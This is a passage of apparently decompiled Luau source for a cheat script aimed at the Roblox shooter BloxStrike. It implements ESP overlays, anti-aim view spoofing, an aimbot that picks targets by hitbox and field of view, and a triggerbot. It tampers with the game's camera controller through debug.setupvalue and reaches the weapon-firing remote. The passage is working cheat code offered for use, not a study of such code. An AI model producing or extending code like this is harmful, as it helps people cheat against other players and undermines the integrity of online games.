										table.insert(tbl19, string.format("[%d studs]", math.floor(magnitude + 0.5)))
									end

									v14.Text.Text = table.concat(tbl19, "\n")
									v14.Text.Visible = v15 and #tbl19 > 0
								end
							end

							if tbl14 and tbl14.Expires > os.clock() then
								local currentCamera = tbl4.Workspace.CurrentCamera

								if currentCamera then
									v13.Position = UDim2.fromOffset(currentCamera.ViewportSize.X * 0.5, currentCamera.ViewportSize.Y * 0.2)
									local v14 = v13
									local v15 = v13
									local v16 = v13
									local text = tbl14.Key
									local color = tbl14.Color
									bloxStrikeC4EspElements = bloxStrikeC4EspElements and fn15("BloxStrike C4 ESP Elements", "Status", tbl17)
									v14.Text = text
									v15.TextColor3 = color
									v16.Visible = bloxStrikeC4EspElements
								else
									v13.Visible = false
								end
							else
								v13.Visible = false
								tbl14 = nil
							end
						end

						local function fn73()
							fn56()
							local now = os.clock()
							local bloxStrikeTrajectoryColor = fn13("BloxStrike Trajectory Color", Color3.fromRGB(100, 255, 140))
							local v14 = fn64(now)

							if v14 then
								fn60(v14.Points, v14.Bounces, bloxStrikeTrajectoryColor)
							end

							if not fn15("BloxStrike Grenade Trajectory Elements", "Thrown", {}) then
								fn57()
								return
							end

							for k, v15 in pairs(tbl9) do
								local flag = not k.Parent

								if not flag then
									flag = now - (v15.Seen or 0) > 0.35
								end

								if flag then
									tbl9[k] = nil
								else
									local dirty = v15.Dirty

									if dirty then
										dirty = now - (v15.Updated or 0) >= 0.12
									end

									if dirty then
										local v16, v17 = fn61(v15.State, v15.Config, v15.Params)

										if v16 then
											v15.Points = v16
											v15.Bounces = v17
										end

										v15.Updated = now
										v15.Dirty = false
									end

									fn60(v15.Points, v15.Bounces, bloxStrikeTrajectoryColor)
								end
							end

							fn57()
						end

						for _, player in ipairs(tbl4.Players:GetPlayers()) do
							fn49(player)
						end

						local v14 = ipairs
						local v15 = table.pack(tbl4.CollectionService:GetTagged("WeaponDropped"))
						v15.n = 1 + v15.n - 1
						table.move(v15, 1, v15.n, 1, v15)

						for _, v16 in v14(table.unpack(v15, 1, v15.n)) do
							fn51(v16)
						end

						local v16 = ipairs
						local v17 = table.pack(tbl4.CollectionService:GetTagged("Bomb"))
						v17.n = 1 + v17.n - 1
						table.move(v17, 1, v17.n, 1, v17)

						for _, v18 in v16(table.unpack(v17, 1, v17.n)) do
							fn54(v18)
						end

						fn17(tbl4.Players.PlayerAdded:Connect(fn49))
						fn17(tbl4.Players.PlayerRemoving:Connect(fn50))
						fn17(tbl4.CollectionService:GetInstanceAddedSignal("WeaponDropped"):Connect(fn51))
						fn17(tbl4.CollectionService:GetInstanceRemovedSignal("WeaponDropped"):Connect(fn52))
						fn17(tbl4.CollectionService:GetInstanceAddedSignal("Bomb"):Connect(fn54))
						fn17(tbl4.CollectionService:GetInstanceRemovedSignal("Bomb"):Connect(fn55))

						fn17(tbl4.CollectionService:GetInstanceRemovedSignal("Grenade"):Connect(function(arg)
							tbl9[arg] = nil
						end))

						fn63()
						fn48()

						return {
							CreateBulletTracer = fn38,
							HandleBulletResult = fn45,
							Update = function()
								local currentCamera = tbl4.Workspace.CurrentCamera
								currentCamera = currentCamera and currentCamera.CFrame.Position
								fn70(currentCamera)
								fn71(currentCamera)
								fn72(currentCamera)
								fn73()
							end,
						}
					end

					local v10 = fn33()
					local tbl6 = { StartedAt = nil }

					local function fn34()
						local now = os.clock()

						if not tbl6.StartedAt then
							tbl6.StartedAt = now
						end

						return now - tbl6.StartedAt
					end

					local function fn35(arg, arg2)
						local ok4, result4 = pcall(function()
							return Enum.EasingStyle[arg]
						end)

						return ok4 and typeof(result4) == "EnumItem" and result4 or arg2
					end

					local function fn36(arg, arg2)
						local tweenService = tbl4.TweenService
						local inOut = Enum.EasingDirection.InOut
						return tweenService:GetValue(math.clamp(arg, 0, 1), arg2, inOut)
					end

					local function fn37(arg)
						local bloxStrikeAntiAimYaw = fn12("BloxStrike Anti Aim Yaw", "None")
						if bloxStrikeAntiAimYaw == "None" then
							return arg
						end

						if bloxStrikeAntiAimYaw == "Backwards" then
							return arg + 3.1415926535897931
						end

						if bloxStrikeAntiAimYaw == "Randomise" then
							return arg + math.rad(math.random(-180, 180))
						end
						local v11 = fn34()
						local n = math.clamp(fn11("BloxStrike Anti Aim Yaw Speed", 10), 1, 50)
						if bloxStrikeAntiAimYaw == "Rotate" then
							return arg + v11 * n
						end

						if bloxStrikeAntiAimYaw == "Custom" then
							return arg + math.rad(math.clamp(fn11("BloxStrike Anti Aim Custom Yaw", 0), -180, 180))
						end

						if bloxStrikeAntiAimYaw == "Sway" then
							local n2 = math.clamp(fn11("BloxStrike Anti Aim Sway Min", -180), -180, 180)
							local n3 = math.clamp(fn11("BloxStrike Anti Aim Sway Max", 180), -180, 180)

							if not (n3 < n2) then
								local v12 = n2
								n2 = n3
								n3 = v12
							end

							local n4 = math.clamp(fn11("BloxStrike Anti Aim Sway Angle", 0), n3, n2)
							local n5 = n2 - n3
							if n5 <= 0 then
								return arg + math.rad(n3)
							end
							local quad = Enum.EasingStyle.Quad
							local v12 = fn35(fn12("BloxStrike Anti Aim Sway Style", "Quad"), quad)
							local n6 = ((n2 - n4) / n5 + v11 * n / math.rad(n5)) % 2
							local n7 = n6 <= 1 and n6 or n6 - 1
							local flag = n6 <= 1 and n2 or n3
							return arg + math.rad(flag + ((n6 <= 1 and n3 or n2) - flag) * fn36(n7, v12))
						end

						return arg
					end

					local function fn38(arg)
						local bloxStrikeAntiAimPitch = fn12("BloxStrike Anti Aim Pitch", "None")
						if bloxStrikeAntiAimPitch == "None" then
							return arg
						end

						if bloxStrikeAntiAimPitch == "Randomise" then
							return math.random() * 2 - 1
						end

						if bloxStrikeAntiAimPitch == "Custom" then
							return math.clamp(fn11("BloxStrike Anti Aim Custom Pitch", 0), -1, 1)
						end

						if bloxStrikeAntiAimPitch == "Rotate" then
							local clamp = math.clamp
							return math.clamp(math.sin(fn34() * clamp(fn11("BloxStrike Anti Aim Pitch Speed", 10), 1, 50)), -1, 1)
						end
						return arg
					end

					local function fn39(arg, arg2)
						if not fn9("BloxStrike Anti Aim") or type(arg) ~= "number" then
							tbl6.StartedAt = nil
							return nil, nil
						end
						local v11 = fn37(arg)

						if fn12("BloxStrike Anti Aim Yaw", "None") ~= "None" then
							local bloxStrikeAntiAimJitter = fn11("BloxStrike Anti Aim Jitter", 0)

							if bloxStrikeAntiAimJitter > 0 then
								v11 += math.rad((math.random() * 2 - 1) * bloxStrikeAntiAimJitter)
							end
						end

						if type(arg2) == "number" then
							arg2 = fn38(arg2)
						end

						return v11, arg2
					end

					local function applyCommand(arg)
						if type(arg) ~= "table" then
							return arg
						end
						local v11, v12 = fn39(arg.LookYaw, arg.VerticalLook)
						if not v11 then
							return arg
						end
						local v13 = table.clone(arg)

						if typeof(arg.Move) == "Vector2" and type(arg.LookYaw) == "number" then
							local x = arg.Move.X
							local v14 = CFrame.Angles(0, arg.LookYaw, 0):VectorToWorldSpace(Vector3.new(x, 0, arg.Move.Y))
							local v15 = CFrame.Angles(0, v11, 0):VectorToObjectSpace(v14)
							v13.Move = Vector2.new(v15.X, v15.Z)
						end

						v13.LookYaw = v11

						if type(v12) == "number" then
							v13.VerticalLook = v12
						end

						return v13
					end

					local function fn40()
						local Circle = fn18("Circle", {
							Visible = false,
							Filled = false,
							Thickness = 1,
							NumSides = 64,
							Transparency = 1,
							Color = Color3.new(1, 1, 1),
						})

						local raycastParams = RaycastParams.new()
						raycastParams.FilterType = Enum.RaycastFilterType.Exclude
						raycastParams.IgnoreWater = true
						local v11 = nil
						local v12 = nil
						local v13 = nil
						local v14 = nil
						local v15 = nil
						local v16 = nil
						local player = nil
						local v17 = nil
						local v18 = nil
						local v19 = nil
						local v20 = nil
						local v21 = nil
						local n = nil
						local n2 = nil
						local toWeaponFirePosition = nil
						local v22 = nil
						local obj = setmetatable({}, { __mode = "k" })
						local obj2 = setmetatable({}, { __mode = "k" })
						local tbl7 = { Time = -math.huge }
						local tbl8 = { Time = -math.huge }
						local tbl9 = { Time = -math.huge }
						local obj3 = setmetatable({}, { __mode = "k" })
						local v23 = nil
						local v24 = nil
						local n3 = -math.huge
						local n4 = -math.huge
						local v25 = nil
						local n5 = 0.033333333333333333
						local n6 = 0.15
						local n7 = 1.5
						local n8 = 0.995
						local n9 = 4
						local n10 = 0.35
						local tbl10 = {}

						if tbl5.CameraController and type(tbl5.CameraController.toWeaponFirePosition) == "function" and type(debug) == "table" and type(debug.getupvalues) == "function" and type(debug.setupvalue) == "function" then
							local ok4, result4 = pcall(debug.getupvalues, tbl5.CameraController.toWeaponFirePosition)

							if ok4 and type(result4) == "table" then
								for k, v26 in pairs(result4) do
									if type(k) == "number" and typeof(v26) == "CFrame" then
										toWeaponFirePosition = tbl5.CameraController.toWeaponFirePosition
										v22 = k
										break
									end
								end
							end
						end

						local function fn41(arg, arg2)
							local v26 = arg2 or fn21()
							local debris = tbl4.Workspace:FindFirstChild("Debris")
							if v11 and v12 == arg and v13 == v26 and v14 == debris then
								raycastParams.FilterDescendantsInstances = v11
								return
							end
							local v27 = fn10({ v26, debris, arg })
							v11 = v27
							v12 = arg
							v13 = v26
							v14 = debris
							raycastParams.FilterDescendantsInstances = v27

							pcall(function()
								raycastParams.CollisionGroup = "Bullet"
							end)
						end

						local function fn42(arg, arg2)
							local flag = tbl5.InputController and type(tbl5.InputController.isActionActive) == "function"
							local flag2 = false

							if flag then
								local result4
								flag2, result4 = pcall(tbl5.InputController.isActionActive, arg)
								flag2 = flag2 and result4 == true
							end

							local ok4, result4 = pcall(tbl4.UserInputService.IsMouseButtonPressed, tbl4.UserInputService, arg2)
							return flag2 or ok4 and result4 == true
						end

						local function fn43(arg)
							return fn29(arg)
						end

						local function fn44(arg, arg2)
							return fn15(arg, arg2, {})
						end

						local function fn45(arg)
							while arg and arg ~= tbl4.Workspace do
								if string.find(string.lower(arg.Name), "smoke", 1, true) then
									return true
								end
								arg = arg.Parent
							end

							return false
						end

						local function fn46()
							if tbl5.FlashEffect and type(tbl5.FlashEffect.IsFlashed) == "function" then
								local ok4, result4 = pcall(tbl5.FlashEffect.IsFlashed)
								if ok4 then
									return result4 == true
								end
							end

							return false
						end

						local function fn47(arg)
							if typeof(arg) == "RaycastResult" then
								return arg
							end

							if type(arg) ~= "table" then
								return nil
							end
							local instance = arg.instance or arg.Instance
							if typeof(instance) ~= "Instance" then
								return nil
							end

							return {
								Instance = instance,
								Position = arg.position or arg.Position,
								Normal = arg.normal or arg.Normal,
								Material = arg.material or arg.Material,
							}
						end

						local function fn48(arg, arg2, arg3)
							if arg3 or not tbl5.CreateVoxelSmoke or type(tbl5.CreateVoxelSmoke.DoesRayIntersectActiveSmoke) ~= "function" then
								return false
							end
							local ok4, result4 = pcall(tbl5.CreateVoxelSmoke.DoesRayIntersectActiveSmoke, arg, arg2)
							return ok4 and result4 == true
						end

						local function fn49(arg, arg2, arg3)
							local magnitude = arg2.Magnitude
							if magnitude <= 0.001 then
								return nil
							end
							local raycast = tbl5.Raycast

							if raycast then
								if arg3 and type(raycast.castThrough) == "function" then
									local ok4, result4 = pcall(raycast.castThrough, arg, arg2.Unit, magnitude, raycastParams.FilterDescendantsInstances or {})
									if ok4 then
										return fn47(result4)
									end
								end

								if type(raycast.cast) == "function" then
									local ok4, result4 = pcall(raycast.cast, arg, arg2, raycastParams, raycastParams.FilterDescendantsInstances or {})
									if ok4 then
										return fn47(result4)
									end
								end
							end

							local ok4, result4 = pcall(tbl4.Workspace.Raycast, tbl4.Workspace, arg, arg2, raycastParams)
							return ok4 and fn47(result4) or nil
						end

						local function fn50(arg, arg2, arg3, arg4, arg5)
							if fn48(arg2, arg2 + arg3, arg4) then
								return nil
							end
							fn41(arg, arg5)

							for i = 1, 16 do
								local v26 = fn49(arg2, arg3, arg4)
								if not v26 then
									return nil
								end

								if not fn45(v26.Instance) then
									return v26
								end

								if not arg4 then
									return nil
								end
								local v27 = table.clone(raycastParams.FilterDescendantsInstances or {})
								table.insert(v27, v26.Instance)
								raycastParams.FilterDescendantsInstances = v27
							end

							return nil
						end

						local function fn51(arg, arg2, arg3)
							if not arg3 and tbl5.CenterScreenRaycast and type(tbl5.CenterScreenRaycast.GetResult) == "function" then
								local ok4, result4 = pcall(tbl5.CenterScreenRaycast.GetResult)
								ok4 = ok4 and fn47(result4) or nil
								if ok4 and not fn45(ok4.Instance) and not fn48(arg.CFrame.Position, ok4.Position, false) then
									return ok4
								end
							end

							local n11 = arg.ViewportSize * 0.5
							local v26 = arg:ViewportPointToRay(n11.X, n11.Y)
							return fn50(arg, v26.Origin, v26.Direction * arg2, arg3)
						end

						local function fn52()
							return math.clamp(fn11("BloxStrike Legit Aimbot FOV", 100), 1, 360)
						end

						local tbl11 = {
							Head = { "Head" },
							Body = { "UpperTorso", "Torso", "LowerTorso", "HumanoidRootPart" },
							Arm = {
								"LeftUpperArm",
								"LeftLowerArm",
								"LeftHand",
								"RightUpperArm",
								"RightLowerArm",
								"RightHand",
								"Left Arm",
								"Right Arm",
							},
							Leg = {
								"LeftUpperLeg",
								"LeftLowerLeg",
								"LeftFoot",
								"RightUpperLeg",
								"RightLowerLeg",
								"RightFoot",
								"Left Leg",
								"Right Leg",
							},
						}

						local function fn53(arg, arg2)
							local tbl12 = obj[arg]

							if not tbl12 then
								tbl12 = {}
								obj[arg] = tbl12
							end

							local v26 = tbl12[arg2]
							if v26 and v26.Parent and v26:IsA("BasePart") then
								return v26
							end
							local v27 = arg:FindFirstChild(arg2)
							if v27 and v27:IsA("BasePart") then
								tbl12[arg2] = v27
								return v27
							end
							return nil
						end

						local function fn54(arg, arg2)
							local tbl12 = {}
							local tbl13 = {}

							for _, v26 in ipairs(arg2) do
								local v27 = ipairs
								local tbl14 = tbl11[v26] or {}

								for _, v28 in v27(tbl14) do
									local v29 = fn53(arg, v28)

									if v29 and not tbl13[v29] then
										tbl13[v29] = true
										table.insert(tbl12, v29)
									end
								end
							end

							return tbl12
						end

						local function fn55(arg, arg2)
							local tbl12 = obj2[arg]

							if not tbl12 then
								tbl12 = {}
								obj2[arg] = tbl12
							end

							local v26 = tbl12[arg2]

							if v26 and #v26 > 0 then
								local flag = true

								for _, v27 in ipairs(v26) do
									if not v27.Parent or not v27:IsDescendantOf(arg) then
										flag = false
										break
									end
								end

								if flag then
									return v26
								end
							end

							local tbl13 = {}
							local v27 = ipairs
							local tbl14 = tbl11[arg2] or {}

							for _, v28 in v27(tbl14) do
								local v29 = fn53(arg, v28)

								if v29 then
									tbl13[#tbl13 + 1] = v29
								end
							end

							if #tbl13 > 0 then
								tbl12[arg2] = tbl13
							end

							return tbl13
						end

						local function fn56(arg, arg2)
							local tbl12 = {}

							for k, v26 in pairs(fn14(arg2, { "Head" })) do
								k = v26 == true and k or v26

								if type(k) == "string" then
									table.insert(tbl12, k)
								end
							end

							return fn54(arg, tbl12)
						end

						local function fn57(arg, arg2, arg3)
							if not arg or typeof(arg2) ~= "Instance" then
								return nil
							end
							local v26 = ipairs
							local v27 = table.pack(fn56(arg, arg3))
							v27.n = 1 + v27.n - 1
							table.move(v27, 1, v27.n, 1, v27)

							for _, v28 in v26(table.unpack(v27, 1, v27.n)) do
								if arg2 == v28 or arg2:IsDescendantOf(v28) then
									return v28
								end
							end

							return nil
						end

						local function fn58(arg, arg2)
							if not arg then
								return nil
							end
							local position = arg.CFrame.Position
							if not fn9("BloxStrike Third Person") then
								return position
							end
							arg2 = arg2 or fn21()
							arg2 = arg2 and arg2:FindFirstChild("Head")
							arg2 = arg2 and arg2.Position
							return typeof(arg2) == "Vector3" and arg2 or position
						end

						local function fn59(arg, arg2, arg3)
							local position = arg3 or arg.CFrame.Position
							local n11 = arg2.Size * 0.5
							local v26 = arg2.CFrame:PointToObjectSpace(position)
							local n12 = math.abs(v26.X) / math.max(n11.X, 0.001)
							local n13 = math.abs(v26.Y) / math.max(n11.Y, 0.001)
							local n14 = math.abs(v26.Z) / math.max(n11.Z, 0.001)
							local n15 = 1

							if n12 < n13 then
								n15 = 2
							end

							if (n15 == 1 and n12 or n13) < n14 then
								n15 = 3
							end

							local n16 = (n15 == 1 and v26.X or n15 == 2 and v26.Y or v26.Z) >= 0 and 1 or -1
							local vector

							if n15 == 1 then
								vector = Vector3.new(n11.X * n16 * 0.98, 0, 0)
							elseif n15 == 2 then
								vector = Vector3.new(0, n11.Y * n16 * 0.98, 0)
							else
								vector = Vector3.new(0, 0, n11.Z * n16 * 0.98)
							end

							local vector2, vector3

							if n15 == 1 then
								vector2 = Vector3.new(0, n11.Y * 0.72, 0)
								vector3 = Vector3.new(0, 0, n11.Z * 0.72)
							elseif n15 == 2 then
								vector2 = Vector3.new(n11.X * 0.72, 0, 0)
								vector3 = Vector3.new(0, 0, n11.Z * 0.72)
							else
								vector2 = Vector3.new(n11.X * 0.72, 0, 0)
								vector3 = Vector3.new(0, n11.Y * 0.72, 0)
							end

							local tbl12 = { arg2.Position }

							for _, v27 in ipairs({ -1, 0, 1 }) do
								for _, v28 in ipairs({ -1, 0, 1 }) do
									table.insert(tbl12, arg2.CFrame:PointToWorldSpace(vector + vector2 * v27 + vector3 * v28))
								end
							end

							return tbl12
						end

						local function fn60(arg, arg2)
							local tbl12 = {}
							local v26 = pairs
							local v27 = table.pack(fn14(arg, arg2))
							v27.n = 1 + v27.n - 1
							table.move(v27, 1, v27.n, 1, v27)

							for k, v28 in v26(table.unpack(v27, 1, v27.n)) do
								tbl12[#tbl12 + 1] = tostring(k) .. "=" .. tostring(v28)
							end

							table.sort(tbl12)
							return table.concat(tbl12, ";")
						end

						local function fn61(arg)
							if type(arg) ~= "table" or not arg.Part or not arg.Part.Parent or typeof(arg.Part.Position) ~= "Vector3" then
								return nil
							end
							local position = arg.Part.Position

							if typeof(arg.Offset) == "Vector3" then
								position = arg.Part.CFrame:PointToWorldSpace(arg.Offset)
							end

							arg.Position = position
							return position
						end

						local function fn62(arg, arg2, arg3, arg4, arg5)
							if type(arg) ~= "table" or arg.Key ~= arg5 or not arg.Player or not arg.Character or arg.Character == arg4 or arg.Character.Parent == nil or not arg.Part or not arg.Part.Parent or not arg.Part:IsDescendantOf(arg.Character) or not fn43(arg.Player) or not fn25(arg.Player, arg.Character) then
								return false
							end
							local v26 = fn61(arg)
							if not v26 then
								return false
							end
							local v27, v28 = arg2:WorldToViewportPoint(v26)
							if not v28 or v27.Z <= 0 then
								return false
							end
							local n11 = arg2.ViewportSize * 0.5
							local n12 = v27.X - n11.X
							local n13 = v27.Y - n11.Y
							if arg3 * arg3 < n12 * n12 + n13 * n13 then
								return false
							end
							arg.Screen = Vector2.new(v27.X, v27.Y)
							return true
						end

						local function fn63(arg, arg2)
							local origin = tbl7.Origin
							local lookVector = tbl7.LookVector
							local lookVector2 = arg.CFrame.LookVector
							return tbl7.Camera == arg and typeof(origin) == "Vector3" and (origin - arg2).Magnitude <= n7 and typeof(lookVector) == "Vector3" and lookVector:Dot(lookVector2) >= n8
						end

						local function fn64(arg, arg2, arg3, arg4)
							return tbl8.Target == arg and tbl8.Part == arg.Part and tbl8.AllowSmoke == arg3 and typeof(tbl8.Origin) == "Vector3" and (tbl8.Origin - arg2).Magnitude <= n7 and typeof(tbl8.Position) == "Vector3" and (tbl8.Position - arg.Position).Magnitude <= n7 and arg4 - tbl8.Time < n5
						end

						local function fn65(arg, arg2)
							return arg and arg.Instance and arg.Instance:IsDescendantOf(arg2)
						end

						local function fn66(arg, arg2, arg3, arg4, arg5, arg6)
							local v26 = arg6 or fn59(arg, arg2.Part, arg3)

							for _, v27 in ipairs(v26) do
								local character = arg2.Character
								if fn65(fn50(arg, arg3, v27 - arg3, arg4, arg5), character) then
									return v27
								end
							end

							return nil
						end

						local function fn67(arg, target, origin, allowSmoke, arg2, time)
							if fn64(target, origin, allowSmoke, time) then
								return tbl8.Visible and target.Position or nil
							end
							local v26 = fn66(arg, target, origin, allowSmoke, arg2)
							tbl8.Target = target
							tbl8.Part = target.Part
							tbl8.Origin = origin
							tbl8.Position = v26 or target.Position
							tbl8.AllowSmoke = allowSmoke
							tbl8.Time = time
							tbl8.Visible = v26 ~= nil

							if v26 then
								target.Position = v26
								target.Offset = target.Part.CFrame:PointToObjectSpace(v26)
								local v27 = arg:WorldToViewportPoint(v26)
								target.Screen = Vector2.new(v27.X, v27.Y)
							end

							return v26
						end

						local function fn68(arg, arg2)
							arg[#arg + 1] = arg2

							table.sort(arg, function(arg3, arg4)
								return arg3.Distance < arg4.Distance
							end)

							if n9 < #arg then
								table.remove(arg)
							end
						end

						local function fn69(camera, radius)
							local v26 = fn21()

							if not v26 or not fn25(localPlayer2, v26) then
								tbl7.Time = -math.huge
								tbl7.Target = nil
								tbl7.Origin = nil
								tbl8.Time = -math.huge
								return nil
							end

							local v27 = fn58(camera, v26)

							if not v27 then
								tbl7.Time = -math.huge
								tbl7.Target = nil
								tbl7.Origin = nil
								tbl8.Time = -math.huge
								return nil
							end

							local v28 = fn44("BloxStrike Legit Aimbot Conditions", "Through Smokes")
							local v29 = fn12("BloxStrike Legit Aimbot Priority Hitbox", "Head")
							local key = v29 .. "|" .. fn60("BloxStrike Legit Aimbot Hitboxes", { "Head" })
							local now = os.clock()
							local v30 = v15
							local flag = false

							if fn62(v15, camera, radius, v26, key) then
								flag = fn67(camera, v30, v27, v28, v26, now) ~= nil
								if flag and now - tbl7.Time < n6 then
									return v30
								end
							end

							local flag2 = tbl7.LocalCharacter == v26 and tbl7.Radius == radius and tbl7.AllowSmoke == v28 and tbl7.Key == key and fn63(camera, v27)

							if not flag and not v30 and flag2 and now - tbl7.Time < (tbl7.Target and 0.15 or 0.1) then
								local target = tbl7.Target
								if not target then
									return nil
								end

								if fn62(target, camera, radius, v26, key) then
									if fn67(camera, target, v27, v28, v26, now) then
										return target
									end
								end
							end

							local n11 = camera.ViewportSize * 0.5
							local tbl12 = {}
							local tbl13 = {}
							local tbl14 = {}

							local function fn70(arg, arg2)
								if type(arg) == "string" and tbl11[arg] and not tbl14[arg] then
									tbl14[arg] = true
									tbl13[arg] = arg2
									tbl12[#tbl12 + 1] = arg
								end
							end

							if v29 == "Closest" then
								fn70("Head", 0)
								fn70("Body", 0)
							else
								local str3 = v29 == "Body" and "Body" or "Head"
								fn70(str3, 0)
								local v31 = pairs
								local v32 = table.pack(fn14("BloxStrike Legit Aimbot Hitboxes", { "Head" }))
								v32.n = 1 + v32.n - 1
								table.move(v32, 1, v32.n, 1, v32)

								for k, v33 in v31(table.unpack(v32, 1, v32.n)) do
									k = v33 == true and k or v33

									if k ~= str3 then
										fn70(k, 1)
									end
								end
							end

							local tbl15 = {}
							local tbl16 = {}

							for _, player2 in ipairs(tbl4.Players:GetPlayers()) do
								local v31 = fn24(player2)

								if fn43(player2) and fn25(player2, v31) then
									for _, v32 in ipairs(tbl12) do
										local v33 = tbl13[v32]
										local v34 = ipairs
										local v35 = table.pack(fn55(v31, v32))
										v35.n = 1 + v35.n - 1
										table.move(v35, 1, v35.n, 1, v35)

										for _, v36 in v34(table.unpack(v35, 1, v35.n)) do
											local position = v36.Position
											local v37, v38 = camera:WorldToViewportPoint(position)

											if v38 and v37.Z > 0 then
												local vector2 = Vector2.new(v37.X, v37.Y)
												local magnitude = (vector2 - n11).Magnitude

												if magnitude <= radius then
													local tbl17 = {
														Player = player2,
														Character = v31,
														Part = v36,
														Position = position,
														Screen = vector2,
														Distance = magnitude,
														Rank = v33,
														Key = key,
													}

													if v33 == 0 then
														fn68(tbl15, tbl17)
													else
														fn68(tbl16, tbl17)
													end
												end
											end
										end
									end
								end
							end

							local function fn71(arg)
								for _, v31 in ipairs(arg) do
									local v32 = fn66(camera, v31, v27, v28, v26, v31.Samples)

									if v32 then
										v31.Position = v32
										v31.Offset = v31.Part.CFrame:PointToObjectSpace(v32)
										local v33 = camera:WorldToViewportPoint(v32)
										v31.Screen = Vector2.new(v33.X, v33.Y)
										return v31
									end
								end

								return nil
							end

							local v31 = fn71(tbl15) or fn71(tbl16)

							if not (not v31 and flag) then
								v30 = v31
							end

							tbl7.Camera = camera
							tbl7.LocalCharacter = v26
							tbl7.Radius = radius
							tbl7.AllowSmoke = v28
							tbl7.Key = key
							tbl7.Origin = v27
							tbl7.LookVector = camera.CFrame.LookVector
							tbl7.Time = now
							tbl7.Target = v30

							if v30 then
								tbl8.Target = v30
								tbl8.Part = v30.Part
								tbl8.Origin = v27
								tbl8.Position = v30.Position
								tbl8.AllowSmoke = v28
								tbl8.Time = now
								tbl8.Visible = true
							end

							return v30
						end

						local function fn70()
							v15 = nil
							v16 = nil
							player = nil
							v17 = nil
						end

						local function fn71()
							local PrimaryFire = fn42("PrimaryFire", Enum.UserInputType.MouseButton1)
							local SecondaryFire = fn42("SecondaryFire", Enum.UserInputType.MouseButton2)
							local v26 = fn12("BloxStrike Legit Aimbot Activation", "On Attack")
							return v26 == "Always" or v26 == "On Attack" and PrimaryFire or v26 == "On Scope" and SecondaryFire or v26 == "Both" and (PrimaryFire or SecondaryFire)
						end

						local function fn72(arg, arg2, arg3)
							local position = arg.CFrame.Position
							if (arg2 - position).Magnitude <= 0.001 then
								return
							end
							local v26 = arg.CFrame:Lerp(CFrame.lookAt(position, arg2, Vector3.new(0, 1, 0)), arg3)

							if toWeaponFirePosition and v22 then
								if pcall(debug.setupvalue, toWeaponFirePosition, v22, v26) and tbl5.CameraController and type(tbl5.CameraController.updateCamera) == "function" then
									pcall(tbl5.CameraController.updateCamera)
								end
							end

							arg.CFrame = v26
						end

						local function fn73(arg)
							if typeof(arg) ~= "Instance" then
								return nil, nil
							end
							arg = arg and arg:FindFirstAncestorOfClass("Model")
							if not arg then
								return nil, nil
							end

							if tbl5.CharacterResolver then
								local ok4, result4 = pcall(tbl5.CharacterResolver.getPlayerFromCharacter, arg)
								if ok4 and result4 then
									return result4, arg
								end
							end

							return tbl4.Players:FindFirstChild(arg.Name), arg
						end

						local function fn74(arg, arg2)
							if not arg or typeof(arg.Instance) ~= "Instance" then
								return nil, nil, nil
							end
							local v26, v27 = fn73(arg.Instance)
							if not v26 or not v27 then
								return nil, nil, nil
							end
							local v28 = fn57(v27, arg.Instance, arg2)
							if not v28 then
								return nil, nil, nil
							end
							return v26, v27, v28
						end

						local function fn75(arg)
							local properties = arg and arg.Properties

							if properties then
								properties = properties.Name or properties.Weapon or properties.Id
							end

							return properties or tostring(arg)
						end

						local function fn76(arg)
							local tbl12 = {}
							local properties = arg and arg.Properties
							tbl12[1] = arg
							tbl12[2] = properties

							if type(tbl5.GetWeaponProperties) == "function" then
								arg = arg and arg.Properties

								if arg then
									arg = arg.Name or arg.Weapon or arg.Id
								end

								if type(arg) == "string" then
									local result4 = tbl10[arg]

									if result4 == nil then
										local ok4
										ok4, result4 = pcall(tbl5.GetWeaponProperties, arg)
										result4 = ok4 and type(result4) == "table" and result4 or false
										tbl10[arg] = result4
									end

									if type(result4) == "table" then
										table.insert(tbl12, result4)
									end
								end
							end

							return tbl12
						end

						local function fn77(arg, arg2)
							for _, v26 in ipairs(fn76(arg)) do
								if type(v26) ~= "table" then
									continue
								end

								for _, v27 in ipairs(arg2) do
									if type(v26[v27]) == "number" then
										return v26[v27]
									end
								end
							end

							return nil
						end

						local tbl12 = { Head = { "Head" }, Body = { "Torso", "Body" }, Arm = { "Arms", "Arm" }, Leg = { "Legs", "Leg" } }

						local function fn78(arg)
							if not arg then
								return nil
							end

							for k, v26 in pairs(tbl11) do
								for _, v27 in ipairs(v26) do
									if arg.Name == v27 then
										return k
									end
								end
							end

							return nil
						end

						local function fn79(arg, arg2, arg3)
							local v26 = arg3 or fn78(arg2)
							local head = nil

							for _, v27 in ipairs(fn76(arg)) do
								local damagePerPart = type(v27) == "table" and (v27.DamagePerPart or v27.Damage or v27.damage)

								if type(damagePerPart) == "number" then
									head = damagePerPart
								elseif type(damagePerPart) == "table" then
									local v28 = ipairs
									local tbl13 = tbl12[v26] or {}

									for _, v29 in v28(tbl13) do
										if type(damagePerPart[v29]) == "number" then
											head = damagePerPart[v29]
											break
										end
									end

									head = head or arg2 and damagePerPart[arg2.Name] or damagePerPart.Head or damagePerPart.Default
								end

								if type(head) == "number" then
									return head
								end
							end

							return nil
						end

						local function fn80(arg, arg2, arg3)
							local n11 = math.clamp(fn11("BloxStrike Legit TriggerBot Hit Chance", 100), 0, 100)
							if n11 < math.random(1, 100) then
								return false
							end
							local v26 = fn77(arg2, { "Spread", "spread", "MaxSpread", "BulletSpread", "Inaccuracy" })
							if not v26 or v26 <= 0 then
								return true
							end

							if v26 > 3.1415926535897931 then
								v26 = math.rad(v26)
							end

							return math.clamp((math.atan(arg3.Size.Magnitude * 0.25 / math.max((arg3.Position - arg.CFrame.Position).Magnitude, 1)) / v26) ^ 2 * 100, 0, 100) >= n11
						end

						local function fn81(arg, arg2, arg3)
							local v26 = fn79(arg, arg2)
							local flag = not v26

							if not flag then
								flag = v26 >= (arg3 or fn11("BloxStrike Legit TriggerBot Min Damage", 1))
							end

							return flag
						end

						local function fn82()
							if not tbl5.InventoryController or type(tbl5.InventoryController.getCurrentEquipped) ~= "function" then
								return nil
							end
							local ok4, result4 = pcall(tbl5.InventoryController.getCurrentEquipped)
							if not ok4 or type(result4) ~= "table" or not result4.Properties then
								return nil
							end

							if result4.Properties.Class ~= "Weapon" then
								return nil
							end
							return result4
						end

						local function fn83()
							local remotes = tbl5.Remotes
							remotes = remotes and remotes.Inventory
							return remotes and remotes.ShootWeapon
						end

						local function fn84(arg)
							local v26 = fn83()
							return arg and v26 and type(v26.Send) == "function" and arg.IsDestroyed ~= true and arg.IsEquipped ~= false and arg.IsReloading ~= true and (type(arg.Rounds) ~= "number" or arg.Rounds > 0)
						end

						local function fn85(arg)
							if not arg then
								return false
							end
